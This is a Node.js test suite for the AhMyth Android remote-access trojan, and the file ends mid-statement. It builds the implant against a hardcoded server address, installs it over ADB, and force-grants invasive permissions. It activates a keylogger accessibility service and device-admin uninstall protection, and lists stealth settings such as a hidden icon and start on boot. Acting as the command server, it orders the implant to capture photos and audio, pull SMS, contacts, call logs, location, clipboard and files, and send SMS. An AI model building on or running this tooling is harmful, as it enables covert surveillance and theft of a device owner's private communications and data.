#!/usr/bin/env node
/**
 * Comprehensive Test Suite for AhMyth ConnectionManager and Stealth Options
 * Tests every function and stealth configuration
 * Automatically detects and uses emulator or ADB device
 */

const { Server } = require('socket.io');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');

const execAsync = promisify(exec);

// Configuration - can be overridden by environment variables
const PORT = parseInt(process.env.PORT) || 1234;
const SERVER_IP = process.env.SERVER_IP || '192.168.0.177'; // Default server IP for build
const TEST_TIMEOUT = 30000; // 30 seconds timeout per test
const TOTAL_TIMEOUT = 600000; // 10 minutes total timeout
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';
const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const QUICK_BUILD_SCRIPT = path.join(FACTORY_PATH, 'quick-build.ps1');
const AUTO_BUILD = process.env.AUTO_BUILD !== 'false'; // Auto-build by default, can be disabled
const FORCE_REBUILD = process.env.FORCE_REBUILD !== 'false'; // Force rebuild by default, can be disabled
const TEST_ONLY_FAILING = process.env.TEST_ONLY_FAILING === 'true' || process.argv.includes('--only-failing'); // Only test previously failing tests
const ADB_DEVICE = process.env.ADB_DEVICE || null; // Specific ADB device to use
// Colors for output
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
    blue: "\x1b[34m",
    gray: "\x1b[90m"
};

// Test results storage
let testResults = [];
let clientSocket = null;
let deviceInfo = null;

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    switch(type) {
        case 'success': color = colors.green; break;
        case 'error': color = colors.red; break;
        case 'warn': color = colors.yellow; break;
        case 'header': color = colors.cyan; break;
        case 'debug': color = colors.blue; break;
        case 'info': color = colors.gray; break;
    }
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

// Utility: Trim response for display
function trimResponse(data, maxLength = 200) {
    if (!data) return 'null';
    const str = typeof data === 'string' ? data : JSON.stringify(data);
    if (str.length <= maxLength) return str;
    return str.substring(0, maxLength) + '...';
}

// Utility: Format time
function formatTime(ms) {
    if (ms < 1000) return `${ms}ms`;
    return `${(ms / 1000).toFixed(2)}s`;
}

// Utility: Check ADB device
async function checkAdbDevice() {
    // If ADB_DEVICE is set, use it
    if (ADB_DEVICE) {
        log(`Using specified device: ${ADB_DEVICE}`, 'info');
        // Verify device is available
        try {
            const { stdout } = await execAsync(`adb -s ${ADB_DEVICE} devices`);
            if (stdout.includes(ADB_DEVICE) && stdout.includes('device')) {
                return ADB_DEVICE;
            } else {
                log(`Specified device ${ADB_DEVICE} not available, auto-detecting...`, 'warn');
            }
        } catch (e) {
            log(`Specified device ${ADB_DEVICE} not available, auto-detecting...`, 'warn');
        }
    }
    
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        const devices = lines.filter(line => line.includes('device') && !line.includes('offline'));
        
        log(`Debug: Found devices: ${JSON.stringify(devices)}`, 'debug');
        if (devices.length === 0) {
            log('No ADB devices found. Checking for emulator...', 'warn');
            // Try to start emulator
            try {
                await execAsync('adb start-server');
                await new Promise(resolve => setTimeout(resolve, 2000));
                const { stdout: stdout2 } = await execAsync('adb devices');
                const lines2 = stdout2.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
                const devices2 = lines2.filter(line => line.includes('device') && !line.includes('offline'));
                if (devices2.length > 0) {
                    log(`Found ${devices2.length} device(s)`, 'success');
                    return devices2[0].split(/\s+/)[0];
                }
            } catch (e) {
                log('Could not start ADB server', 'error');
            }
            return null;
        }
        
        log(`Found ${devices.length} device(s)`, 'success');
        return devices[0].split(/\s+/)[0]; // Split by any whitespace to be more robust
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        return null;
    }
}

// Utility: Get device info via ADB
async function getDeviceInfo(deviceId = null) {
    try {
        const deviceFlag = deviceId ? `-s ${deviceId}` : '';
        const [model, manufacturer, androidVersion, sdk] = await Promise.all([
            execAsync(`adb ${deviceFlag} shell getprop ro.product.model`).then(r => r.stdout.trim()),
            execAsync(`adb ${deviceFlag} shell getprop ro.product.manufacturer`).then(r => r.stdout.trim()),
            execAsync(`adb ${deviceFlag} shell getprop ro.build.version.release`).then(r => r.stdout.trim()),
            execAsync(`adb ${deviceFlag} shell getprop ro.build.version.sdk`).then(r => r.stdout.trim())
        ]);
        
        return { model, manufacturer, androidVersion, sdk };
    } catch (error) {
        log(`Failed to get device info: ${error.message}`, 'warn');
        return { model: 'Unknown', manufacturer: 'Unknown', androidVersion: 'Unknown', sdk: 'Unknown' };
    }
}

// Utility: Check if app is installed
async function isAppInstalled(deviceId = null) {
    try {
        const deviceFlag = deviceId ? `-s ${deviceId}` : '';
        const { stdout } = await execAsync(`adb ${deviceFlag} shell "pm list packages | grep ${PACKAGE_NAME}"`);
        return stdout.includes(PACKAGE_NAME);
    } catch (error) {
        return false;
    }
}

// Utility: Get stealth config from device (via ADB logcat or smali inspection)
async function getStealthConfig() {
    // This would require reading the APK or checking logs
    // For now, return default values
    return {
        HIDE_ICON: true,
        HIDE_FROM_RECENTS: false,
        START_ON_BOOT: true,
        SILENT_NOTIFICATION: false,
        PERSISTENT_SERVICE: true,
        WAKE_LOCK: true,
        AUTO_CLOSE_ACTIVITY: false,
        UNINSTALL_PROTECTION: false
    };
}

// Test runner
class TestRunner {
    constructor() {
        this.server = null;
        this.ioServer = null;
        this.currentTestIndex = 0;
        this.tests = [];
        this.results = [];
        this.deviceId = null;
    }

    async initialize() {
        log(`AUTO_BUILD: ${AUTO_BUILD}`, 'debug');
        log(`FORCE_REBUILD: ${FORCE_REBUILD}`, 'debug');
        const deviceId = await checkAdbDevice();
        if (!deviceId) {
            log('No device found. Please connect a device or start an emulator.', 'error');
            process.exit(1);
        }
        
        this.deviceId = deviceId; // Store for use in stealth checks
        
        deviceInfo = await getDeviceInfo(deviceId);
        log(`Device: ${deviceInfo.manufacturer} ${deviceInfo.model} (Android ${deviceInfo.androidVersion})`, 'header');
        
        // Auto-build, install, and run if enabled
        if (AUTO_BUILD) {
            // Always uninstall old version and rebuild with latest changes
            const installed = await isAppInstalled(deviceId);
            if (installed) {
                log('App already installed. Uninstalling old version...', 'info');
                try {
                    await execAsync(`adb ${deviceId ? `-s ${deviceId}` : ''} uninstall ${PACKAGE_NAME}`);
                    log('Old version uninstalled', 'success');
                } catch (error) {
                    log(`Uninstall warning: ${error.message}`, 'warn');
                    // Continue anyway - will try to install over it
                }
            }
            
            // Always build and install new version with latest changes
            log('', 'header');
            log('════════════════════════════════════════════════════════════', 'header');
            log('Auto-Build, Install & Run (Always Rebuild)', 'header');
            log('════════════════════════════════════════════════════════════', 'header');
            
            try {
                await this.buildInstallAndRun(deviceId);
            } catch (error) {
                log(`Build/Install failed: ${error.message}`, 'error');
                log('Continuing with tests anyway (app may already be installed)...', 'warn');
            }
        } else {
            // Check if app is installed
            const installed = await isAppInstalled(deviceId);
            if (!installed) {
                log('AhMyth app not installed. Please install it first.', 'warn');
                log('You can install it using: adb install <path-to-apk>', 'info');
                log('Or set AUTO_BUILD=true to auto-build and install', 'info');
            }
        }
        
        // Start server
        await this.startServer();
        
        // Define all tests
        this.defineTests();
    }

    async buildInstallAndRun(deviceId) {
        log('[1/5] Building APK...', 'header');
        log(`Target: ${SERVER_IP}:${PORT}`, 'info');
        
        const apkPath = await this.buildApk();
        
        log('[2/5] Installing APK...', 'header');
        await this.installApk(apkPath, deviceId);
        
        log('[3/5] Granting permissions...', 'header');
        await this.grantPermissions(deviceId);
        
        log('[4/5] Starting app...', 'header');
        await this.startApp(deviceId);
        
        log('[5/5] Waiting for connection...', 'header');
        await this.waitForConnection(30000, deviceId);
    }

    async buildApk() {
        log('Starting APK build process...', 'debug');
        try {
            if (!fs.existsSync(QUICK_BUILD_SCRIPT)) {
                throw new Error(`Build script not found: ${QUICK_BUILD_SCRIPT}`);
            }
            
            const buildCmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Set-Location '${FACTORY_PATH}'; .\\quick-build.ps1 -IP '${SERVER_IP}' -Port ${PORT} }"`;
            
            log('Executing build command...', 'info');
            const { stdout, stderr } = await execAsync(buildCmd, { 
                maxBuffer: 10 * 1024 * 1024,
                cwd: FACTORY_PATH 
            });
            
            if (stderr && !stderr.includes('Warning')) {
                log(`Build warnings: ${stderr}`, 'warn');
            }
            
            // Find the latest built APK (exclude .idsig files)
            const apkFiles = fs.readdirSync(FACTORY_PATH)
                .filter(f => f.endsWith('.apk') && f.includes('aligned-debugSigned') && f.startsWith('Ahmyth-') && !f.endsWith('.idsig'))
                .map(f => ({
                    name: f,
                    path: path.join(FACTORY_PATH, f),
                    time: fs.statSync(path.join(FACTORY_PATH, f)).mtime
                }))
                .sort((a, b) => b.time - a.time);
            
            if (apkFiles.length === 0) {
                throw new Error('No APK file found after build');
            }
            
            const apkFile = apkFiles[0];
            log(`APK built: ${apkFile.name}`, 'success');
            log(`Size: ${(fs.statSync(apkFile.path).size / 1024 / 1024).toFixed(2)} MB`, 'info');
            
            return apkFile.path;
        } catch (error) {
            log(`Build failed: ${error.message}`, 'error');
            throw error;
        }
    }

    async restartAdbServer() {
        try {
            log('Restarting ADB server...', 'info');
            // Kill ADB server
            await execAsync('adb kill-server').catch(() => {
                // Ignore errors
            });
            
            // Wait a moment
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Start ADB server
            await execAsync('adb start-server');
            
            // Wait for server to be ready
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            log('ADB server restarted', 'success');
        } catch (error) {
            log(`ADB server restart warning: ${error.message}`, 'warn');
            // Continue anyway
        }
    }

    async installApk(apkPath, deviceId) {
        log(`Starting APK installation for ${apkPath} on device ${deviceId}...`, 'debug');
        try {
            const deviceFlag = deviceId ? `-s ${deviceId}` : '';

            // First try without restarting ADB server
            log('Attempting installation without ADB restart...', 'info');

            // Always uninstall previous version (even if not installed, to ensure clean state)
            log('Uninstalling previous version (if exists)...', 'info');
            try {
                await execAsync(`adb ${deviceFlag} uninstall ${PACKAGE_NAME}`, { timeout: 10000 });
                log('Previous version removed', 'success');
            } catch (error) {
                // Ignore if not installed - this is expected
                log('No previous version found (clean install)', 'info');
            }
            
            // Install new APK with timeout and retry
            log('Installing APK (this may take up to 60 seconds)...', 'info');
            
            return new Promise((resolve, reject) => {
                const installProcess = spawn('adb', [
                    ...(deviceId ? ['-s', deviceId] : []),
                    'install', '-r', '-g', apkPath
                ], {
                    stdio: ['ignore', 'pipe', 'pipe'],
                    shell: false
                });
                
                let stdout = '';
                let stderr = '';
                
                installProcess.stdout.on('data', (data) => {
                    const output = data.toString();
                    stdout += output;
                    // Show progress
                    if (output.includes('Performing') || output.includes('Installing') || output.includes('Streamed')) {
                        process.stdout.write('.');
                    }
                });
                
                installProcess.stderr.on('data', (data) => {
                    const output = data.toString();
                    stderr += output;
                    // Check for ADB daemon errors
                    if (output.includes('daemon') || output.includes('cannot connect')) {
                        log('\nADB connection issue detected, will retry...', 'warn');
                    }
                });
                
                // Set timeout (60 seconds)
                const timeout = setTimeout(() => {
                    installProcess.kill();
                    reject(new Error('Installation timeout after 60 seconds'));
                }, 60000);
                
                installProcess.on('close', (code) => {
                    clearTimeout(timeout);
                    console.log(''); // New line after dots
                    
                    const output = stdout + stderr;
                    
                    // Check for ADB daemon errors
                    if (output.includes('daemon') || output.includes('cannot connect') || output.includes('10048')) {
                        log('ADB daemon error detected, retrying installation...', 'warn');
                        // Retry once after restarting ADB
                        setTimeout(async () => {
                            try {
                                await this.restartAdbServer();
                                await new Promise(resolve => setTimeout(resolve, 2000));
                                
                                // Retry installation
                                const retryProcess = spawn('adb', [
                                    ...(deviceId ? ['-s', deviceId] : []),
                                    'install', '-r', '-g', apkPath
                                ], {
                                    stdio: ['ignore', 'pipe', 'pipe'],
                                    shell: false
                                });
                                
                                let retryStdout = '';
                                let retryStderr = '';
                                
                                retryProcess.stdout.on('data', (data) => {
                                    retryStdout += data.toString();
                                    process.stdout.write('.');
                                });
                                
                                retryProcess.stderr.on('data', (data) => {
                                    retryStderr += data.toString();
                                });
                                
                                const retryTimeout = setTimeout(() => {
                                    retryProcess.kill();
                                    reject(new Error('Retry installation timeout'));
                                }, 60000);
                                
                                retryProcess.on('close', (retryCode) => {
                                    clearTimeout(retryTimeout);
                                    console.log('');
                                    const retryOutput = retryStdout + retryStderr;
                                    if (retryCode === 0 || retryOutput.includes('Success') || retryOutput.includes('success')) {
                                        log('APK installed successfully (after retry)', 'success');
                                        resolve();
                                    } else {
                                        reject(new Error(`Installation failed after retry (code ${retryCode}): ${retryOutput || retryStderr}`));
                                    }
                                });
                                
                                retryProcess.on('error', (error) => {
                                    clearTimeout(retryTimeout);
                                    reject(new Error(`Retry installation error: ${error.message}`));
                                });
                            } catch (retryError) {
                                reject(new Error(`Retry failed: ${retryError.message}`));
                            }
                        }, 2000);
                        return;
                    }
                    
                    if (code === 0 || output.includes('Success') || output.includes('success')) {
                        log('APK installed successfully', 'success');
                        resolve();
                    } else {
                        reject(new Error(`Installation failed (code ${code}): ${output || stderr || 'Unknown error'}`));
                    }
                });
                
                installProcess.on('error', (error) => {
                    clearTimeout(timeout);
                    reject(new Error(`Installation process error: ${error.message}`));
                });
            });
        } catch (error) {
            log(`Installation failed: ${error.message}`, 'error');
            throw error;
        }
    }

    async grantPermissions(deviceId) {
        log(`Granting permissions on device ${deviceId}...`, 'debug');
        const permissions = [
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.READ_CONTACTS',
            'android.permission.WRITE_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.SEND_SMS',
            'android.permission.RECEIVE_SMS',
            'android.permission.READ_CALL_LOG',
            'android.permission.READ_PHONE_STATE',
            'android.permission.CALL_PHONE',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.ACCESS_COARSE_LOCATION',
            'android.permission.ACCESS_BACKGROUND_LOCATION',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.POST_NOTIFICATIONS',
            'android.permission.GET_ACCOUNTS',
            'android.permission.ACCESS_WIFI_STATE',
            'android.permission.CHANGE_WIFI_STATE'
        ];
        
        const appops = [
            'SYSTEM_ALERT_WINDOW',
            'GET_USAGE_STATS',
            'WRITE_SETTINGS',
            'MANAGE_EXTERNAL_STORAGE',
            'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
            'RUN_IN_BACKGROUND',
            'RUN_ANY_IN_BACKGROUND'
        ];
        
        let granted = 0;
        const deviceFlag = deviceId ? `-s ${deviceId}` : '';
        
        // Grant runtime permissions
        for (const perm of permissions) {
            try {
                await execAsync(`adb ${deviceFlag} shell pm grant ${PACKAGE_NAME} ${perm}`);
                granted++;
            } catch (error) {
                // Ignore individual permission failures
            }
        }
        
        // Grant special permissions
        for (const op of appops) {
            try {
                await execAsync(`adb ${deviceFlag} shell appops set ${PACKAGE_NAME} ${op} allow`);
                granted++;
            } catch (error) {
                // Ignore
            }
        }
        
        // Battery optimization whitelist
        try {
            await execAsync(`adb ${deviceFlag} shell cmd deviceidle whitelist +${PACKAGE_NAME}`);
            granted++;
        } catch (error) {
            // Ignore
        }
        
        // Grant Device Admin (for UNINSTALL_PROTECTION stealth feature)
        try {
            log('Attempting to activate device admin...', 'info');
            // Try to set as active admin (requires user confirmation on some devices, but may work on test devices)
            await execAsync(`adb ${deviceFlag} shell dpm set-active-admin ${PACKAGE_NAME}/.AdminReceiver`);
            log('Device admin activated', 'success');
            granted++;
        } catch (error) {
            // Device admin activation may require user interaction or device owner mode
            // Try device owner mode (only works on unprovisioned devices or with --user 0)
            try {
                await execAsync(`adb ${deviceFlag} shell dpm set-device-owner ${PACKAGE_NAME}/.AdminReceiver`);
                log('Device owner set (full admin privileges)', 'success');
                granted++;
            } catch (error2) {
                log('Device admin activation requires user interaction', 'warn');
                log('Opening device admin settings on device...', 'info');
                try {
                    // Open device admin settings
                    await execAsync(`adb ${deviceFlag} shell am start -a android.app.action.ADD_DEVICE_ADMIN -e android.app.extra.DEVICE_ADMIN ${PACKAGE_NAME}/.AdminReceiver`);
                    log('Device admin settings opened - Please approve on device', 'info');
                    await new Promise(resolve => setTimeout(resolve, 3000)); // Wait for user to approve
                } catch (e) {
                    log('Could not open device admin settings automatically', 'warn');
                }
            }
        }
        
        // Grant Notification Listener Service access (for notification monitoring)
        try {
            await execAsync(`adb ${deviceFlag} shell cmd notification allow_listener ${PACKAGE_NAME}/.NotificationReader`);
            granted++;
            log('Notification listener service enabled', 'success');
        } catch (error) {
            // May require user interaction on some devices
            log('Notification listener requires user interaction', 'warn');
            log('Opening notification access settings on device...', 'info');
            try {
                // Open notification access settings
                await execAsync(`adb ${deviceFlag} shell am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS`);
                log('Notification access settings opened - Please enable for this app', 'info');
                await new Promise(resolve => setTimeout(resolve, 3000)); // Wait for user to enable
            } catch (e) {
                log('Could not open notification settings automatically', 'warn');
            }
        }
        
        // Grant Accessibility Service (for keylogger and permission auto-grant)
        try {
            // Enable accessibility service via settings (may require user interaction)
            await execAsync(`adb ${deviceFlag} shell settings put secure enabled_accessibility_services ${PACKAGE_NAME}/.KeyloggerService:${PACKAGE_NAME}/.PermissionGranterService`);
            await execAsync(`adb ${deviceFlag} shell settings put secure accessibility_enabled 1`);
            granted++;
            log('Accessibility services enabled', 'success');
        } catch (error) {
            log('Accessibility services may require user interaction', 'warn');
            log('Opening accessibility settings on device...', 'info');
            try {
                // Open accessibility settings
                await execAsync(`adb ${deviceFlag} shell am start -a android.settings.ACCESSIBILITY_SETTINGS`);
                log('Accessibility settings opened - Please enable services for this app', 'info');
                await new Promise(resolve => setTimeout(resolve, 3000)); // Wait for user to enable
            } catch (e) {
                log('Could not open accessibility settings automatically', 'warn');
            }
        }
        
        // Grant Autostart/Background permission (for Xiaomi/MIUI devices)
        try {
            log('Granting autostart/background permission for Xiaomi devices...', 'info');
            // MIUI autostart permission - try various methods
            let autostartGranted = false;
            
            // Method 1: Try MIUI-specific appops
            try {
                await execAsync(`adb ${deviceFlag} shell appops set ${PACKAGE_NAME} START_IN_BACKGROUND allow`);
                autostartGranted = true;
            } catch (e) {
                // Try alternative
            }
            
            // Method 2: Try opening MIUI autostart settings
            if (!autostartGranted) {
                try {
                    // Open MIUI Security/App management settings
                    await execAsync(`adb ${deviceFlag} shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:${PACKAGE_NAME}`);
                    log('App settings opened - Please enable "Autostart" in MIUI Security settings', 'info');
                    log('Waiting 5 seconds for you to enable autostart...', 'info');
                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait for user to enable
                    
                    // Also try opening MIUI Security center directly
                    try {
                        await execAsync(`adb ${deviceFlag} shell am start -n com.miui.securitycenter/.ui.settings.SettingsActivity`);
                        log('MIUI Security Center opened - Please enable Autostart for this app', 'info');
                        await new Promise(resolve => setTimeout(resolve, 3000));
                    } catch (e) {
                        // Ignore if MIUI Security Center not available
                    }
                } catch (e) {
                    log('Could not open app settings automatically', 'warn');
                }
            }
            
            // General background start permissions
            try {
                await execAsync(`adb ${deviceFlag} shell appops set ${PACKAGE_NAME} START_FOREGROUND allow`);
                granted++;
            } catch (e) {
                // Ignore
            }
            
            if (autostartGranted) {
                granted++;
                log('Autostart permission granted', 'success');
            } else {
                log('Autostart permission requires manual activation', 'warn');
                log('Please enable "Autostart" for this app in: Settings > Apps > Manage apps > [App Name] > Autostart', 'info');
            }
        } catch (error) {
            log('Autostart permission error: ' + error.message, 'warn');
            // Try to open settings anyway
            try {
                await execAsync(`adb ${deviceFlag} shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:${PACKAGE_NAME}`);
                log('App settings opened - Please enable Autostart manually', 'info');
                await new Promise(resolve => setTimeout(resolve, 3000));
            } catch (e) {
                log('Could not open app settings', 'warn');
            }
        }
        
        log(`Granted ${granted} permissions`, 'success');
    }

    async startApp(deviceId) {
        log(`Starting app on device ${deviceId}...`, 'debug');
        try {
            const deviceFlag = deviceId ? `-s ${deviceId}` : '';
            
            // Start MainActivity (it will handle starting the service)
            log('Starting MainActivity...', 'info');
            await execAsync(`adb ${deviceFlag} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
            
            // Wait for activity to start
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Try to start service using component name (more reliable)
            try {
                await execAsync(`adb ${deviceFlag} shell am startservice -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainService`);
                log('Service start command sent', 'info');
            } catch (serviceError) {
                // Service might already be running or will be started by MainActivity
                log('Service start via ADB failed (may already be running)', 'warn');
            }
            
            // Wait a bit more for service to initialize
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Verify app is running
            const { stdout } = await execAsync(`adb ${deviceFlag} shell pidof ${PACKAGE_NAME}`).catch(() => ({ stdout: '' }));
            
            if (stdout.trim()) {
                log(`App is running (PID: ${stdout.trim()})`, 'success');
            } else {
                // Check if service is running via dumpsys
                try {
                    const { stdout: services } = await execAsync(`adb ${deviceFlag} shell "dumpsys activity services | grep ${PACKAGE_NAME}"`);
                    if (services.includes('MainService')) {
                        log('Service is running (verified via dumpsys)', 'success');
                    } else {
                        log('App may not be running (check manually)', 'warn');
                    }
                } catch (e) {
                    log('App may not be running (check manually)', 'warn');
                }
            }
        } catch (error) {
            log(`Error starting app: ${error.message}`, 'warn');
            // Continue anyway - app might still connect
        }
    }

    async waitForConnection(maxWait = 30000, deviceId = null) {
        log('Waiting for client to connect...', 'info');
        
        const deviceFlag = deviceId ? `-s ${deviceId}` : '';
        const startTime = Date.now();
        while (Date.now() - startTime < maxWait) {
            try {
                // Check if service is running - run grep inside adb shell
                const { stdout } = await execAsync(`adb ${deviceFlag} shell "dumpsys activity services | grep ${PACKAGE_NAME}"`);
                if (stdout.includes('MainService')) {
                    log('Service is running', 'success');
                    // Give it a moment to connect
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    return true;
                }
            } catch (error) {
                // Service not found yet
            }
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            process.stdout.write('.');
        }
        
        console.log('');
        log('Connection wait timeout', 'warn');
        return false;
    }

    async startServer() {
        return new Promise((resolve) => {
            log(`Starting test server on port ${PORT}...`, 'header');
            this.server = http.createServer();
            this.server.listen(PORT, '0.0.0.0', () => {
                log(`Server listening on port ${PORT}`, 'success');
                
                this.ioServer = new Server(this.server, {
                    pingInterval: 25000,
                    pingTimeout: 20000,
                    allowEIO3: true,
                    cors: {
                        origin: "*",
                        methods: ["GET", "POST"]
                    }
                });
                
                this.ioServer.on('connection', (socket) => {
                    log(`Client connected: ${socket.id}`, 'success');
                    clientSocket = socket;
                    let handshakeReceived = false;
                    
                    socket.on('disconnect', (reason) => {
                        log(`Client disconnected: ${reason}`, 'warn');
                        clientSocket = null;
                    });
                    
                    socket.on('client_connected', (data) => {
                        if (!handshakeReceived) {
                            log(`Client handshake received`, 'success');
                            deviceInfo = { ...deviceInfo, ...data };
                            handshakeReceived = true;
                            // Start tests after handshake
                            setTimeout(() => {
                                if (clientSocket && this.currentTestIndex === 0) {
                                    this.runNextTest();
                                }
                            }, 1000);
                        }
                    });
                });
                
                resolve();
            });
        });
    }

    defineTests() {
        // === CONNECTION TESTS ===
        this.tests.push({
            id: 'connection',
            name: 'Client Connection',
            category: 'Connection',
            description: 'Verify client connects and sends handshake',
            type: 'connection',
            verify: (data) => data !== null
        });

        // === CAMERA TESTS ===
        this.tests.push({
            id: 'camera_list',
            name: 'Camera List',
            category: 'Camera',
            description: 'Get available cameras',
            command: { order: 'x0000ca', extra: 'camList' },
            verify: (data) => {
                return data && (data.camList === true || Array.isArray(data.list));
            }
        });

        this.tests.push({
            id: 'camera_back',
            name: 'Camera Photo (Back)',
            category: 'Camera',
            description: 'Take photo with back camera',
            command: { order: 'x0000ca', extra: '0' },
            verify: (data) => {
                if (data && data.bypass === true) return true; // Fallback to screen capture
                return data && (data.image === true || data.buffer);
            }
        });

        this.tests.push({
            id: 'camera_front',
            name: 'Camera Photo (Front)',
            category: 'Camera',
            description: 'Take photo with front camera',
            command: { order: 'x0000ca', extra: '1' },
            verify: (data) => {
                if (data && data.bypass === true) return true;
                return data && (data.image === true || data.buffer);
            }
        });

        // === FILE MANAGER TESTS ===
        this.tests.push({
            id: 'file_list',
            name: 'File Manager - List',
            category: 'File Manager',
            description: 'List files in /sdcard directory', // Changed description
            command: { order: 'x0000fm', extra: 'ls', path: '/sdcard' }, // Changed path
            verify: (data) => Array.isArray(data) || (data && typeof data === 'object')
        });

        this.tests.push({
            id: 'file_download',
            name: 'File Manager - Download',
            category: 'File Manager',
            description: 'Download a test file from downloads folder',
            command: { order: 'x0000fm', extra: 'dl', path: null }, // Path will be set dynamically
            verify: (data) => data !== null,
            timeout: 60000 // 60 seconds for file downloads (larger files may take time)
        });

        // === SMS TESTS ===
        this.tests.push({
            id: 'sms_list',
            name: 'SMS List',
            category: 'SMS',
            description: 'Get SMS messages',
            command: { order: 'x0000sm', extra: 'ls' },
            verify: (data) => Array.isArray(data) || (data && typeof data === 'object')
        });

        this.tests.push({
            id: 'sms_send',
            name: 'SMS Send',
            category: 'SMS',
            description: 'Send test SMS',
            command: { order: 'x0000sm', extra: 'sendSMS', to: '123', sms: 'AhMyth Test' },
            verify: (data) => data === true || data === false || (data && data.success !== undefined)
        });

        // === CONTACTS TESTS ===
        this.tests.push({
            id: 'contacts',
            name: 'Contacts List',
            category: 'Contacts',
            description: 'Get contacts',
            command: { order: 'x0000cn' },
            verify: (data) => Array.isArray(data) || (data && typeof data === 'object')
        });

        // === CALL LOGS TESTS ===
        this.tests.push({
            id: 'call_logs',
            name: 'Call Logs',
            category: 'Call Logs',
            description: 'Get call logs',
            command: { order: 'x0000cl' },
            verify: (data) => Array.isArray(data) || (data && typeof data === 'object')
        });

        // === MICROPHONE TESTS ===
        this.tests.push({
            id: 'microphone',
            name: 'Microphone Record',
            category: 'Microphone',
            description: 'Record 3 seconds of audio',
            command: { order: 'x0000mc', sec: 3 },
            verify: (data) => data && data.buffer && data.buffer.length > 0
        });

        // === LOCATION TESTS ===
        this.tests.push({
            id: 'location',
            name: 'Location GPS',
            category: 'Location',
            description: 'Get GPS location',
            command: { order: 'x0000lm' },
            verify: (data) => {
                if (data === 'EnableGPS') return true; // GPS disabled
                const loc = typeof data === 'string' ? JSON.parse(data) : data;
                return loc && (loc.lat !== undefined || loc.enable !== undefined);
            }
        });

        // === DEVICE INFO TESTS ===
        this.tests.push({
            id: 'device_info',
            name: 'Device Info',
            category: 'Device Info',
            description: 'Get basic device info',
            command: { order: 'x0000di' },
            verify: (data) => data && data.id !== undefined && data.model !== undefined
        });

        // === APPS TESTS ===
        this.tests.push({
            id: 'apps_list',
            name: 'Apps List',
            category: 'Apps',
            description: 'Get installed apps',
            command: { order: 'x0000ap' },
            verify: (data) => data && (data.appsList || Array.isArray(data))
        });

        // === CLIPBOARD TESTS ===
        this.tests.push({
            id: 'clipboard_get',
            name: 'Clipboard Get',
            category: 'Clipboard',
            description: 'Get clipboard content (will start listener and set test text first)',
            command: { order: 'x0000cb', extra: 'get' },
            verify: (data) => {
                if (!data) return false;
                // Check if response has the expected structure
                if (data.hasData === undefined && data.text === undefined) return false;
                // On Android 10+, clipboard might be empty if app is not in foreground
                // So we accept the structure even if hasData is false
                // But ideally, if we set text, it should be readable
                const hasStructure = data.hasOwnProperty('hasData') || data.hasOwnProperty('text');
                if (!hasStructure) return false;
                // If we have text, verify it's not empty (or at least the structure is correct)
                // For now, just verify structure exists (Android 10+ restrictions may prevent reading)
                return true;
            },
            timeout: 25000, // 25 seconds - may need time to bring app to foreground on Android 10+
            setup: async (deviceId) => {
                const deviceFlag = deviceId ? `-s ${deviceId}` : '';
                
                // Step 1: Start clipboard listener first (so it can cache clipboard changes)
                log(`Starting clipboard listener...`, 'info');
                try {
                    // Send start command via socket if available, otherwise we'll do it in the test
                    // For now, we'll start it in the test itself before reading
                } catch (e) {
                    log(`Could not start clipboard listener: ${e.message}`, 'warn');
                }
                
                // Step 2: Bring app to foreground (required for Android 10+ clipboard access)
                try {
                    await execAsync(`adb ${deviceFlag} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    log(`App brought to foreground for clipboard access`, 'info');
                } catch (e) {
                    log(`Could not bring app to foreground: ${e.message}`, 'warn');
                }
                
                // Step 3: Try to set clipboard using input method (works when app is in foreground)
                const testText = `AhMythTest${Date.now()}`;
                log(`Attempting to set clipboard to: ${testText}`, 'info');
                
                // Method 1: Try using service call (Android 4.0+) - may not work on Android 10+
                try {
                    await execAsync(`adb ${deviceFlag} shell service call clipboard 1 s16 "${testText}"`);
                    log(`Clipboard set via service call`, 'debug');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (e) {
                    log(`Service call method failed (expected on Android 10+): ${e.message}`, 'debug');
                }
                
                // Method 2: Try using am broadcast (some devices)
                try {
                    await execAsync(`adb ${deviceFlag} shell am broadcast -a clipper.set -e text "${testText}"`);
                    log(`Clipboard set via broadcast`, 'debug');
                    await new Promise(resolve => setTimeout(resolve, 500));
                } catch (e) {
                    // Ignore - this method may not work on all devices
                }
                
                // Method 3: Use input text to simulate typing (requires app in foreground)
                // This won't set clipboard directly, but ensures app is active
                try {
                    // Open a text field and type (this won't work without a text field)
